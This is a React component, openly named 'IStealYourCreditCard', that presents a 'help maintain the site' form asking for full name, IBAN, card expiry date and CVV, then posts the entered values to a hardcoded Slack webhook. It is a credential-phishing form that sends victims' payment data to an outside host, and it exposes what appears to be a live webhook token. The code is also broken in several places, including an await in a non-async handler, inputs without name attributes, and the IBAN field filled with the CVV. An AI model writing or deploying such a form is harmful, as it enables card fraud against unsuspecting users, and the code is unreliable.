import "./IStealYourCreditCard.css";
import {useState} from "react";

async function sendToSlack(message: string) {
    const respone = await fetch('https://hooks.slack.com/services/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', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: message }),
    })

    if(!respone.ok) {
        throw new Error('Sending to Slack failed');
    }
}


function IStealYourCreditCard() {

    const [formData, setFormData] = useState({
        fullName: '',
        iban: '',
        expiryDate: '',
        cvv: 0,
    })

    function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
        const { name, value } = e.target;
        setFormData(prev => ({ ...prev, [name]: value }));
    }

    return (
        <div className="isteal-your-credit-card">
            <h1 className={"h1"}>You want to help me maintaining the site?</h1>

            <p>If you want to help me with the Site, fill out this form:</p>

            <div className="input-group py-1">
                <div className="form-floating">
                    <input className="form-control" type="text" id="credit-card-full-name" placeholder="Name" onChange={handleChange} />
                    <label htmlFor="credit-card-full-name">Full Name</label>
                </div>

                <div className="form-floating">
                    <input className="form-control" type="text" id="credit-card-iban" placeholder=""
                           spellCheck="false" onChange={handleChange} />
                    <label htmlFor="credit-card-iban">IBAN</label>
                </div>
            </div>
            <div className="input-group py-1">
                <div className="form-floating">
                    <input className="form-control" type="text" autoComplete="cc-exp" id="credit-card-expiration-date"
                           placeholder="" name={formData.fullName} onChange={handleChange} />
                    <label htmlFor="credit-card-expiration-date">Expiration date</label>
                </div>
                <div className="form-floating">
                    <input className="form-control" type="number" autoComplete="cc-cvv" id="credit-card-cvv"
                           placeholder="" onChange={handleChange} />
                    <label htmlFor="credit-card-cvv">CVV</label>
                </div>
            </div>
            <div className={"credit-card-button-container py-4"}>
                <button className="btn btn-primary credit-card-button" type="submit" onSubmit={() => {
                    await sendToSlack(
                        `Name: ${formData.fullName}\n IBAN: ${formData.cvv} \n Expiration Date: ${formData.expiryDate}\n CVV: ${formData.cvv}`,
                    )
                }}>Submit</button>
            </div>
        </div>
    );
}

export default IStealYourCreditCard;
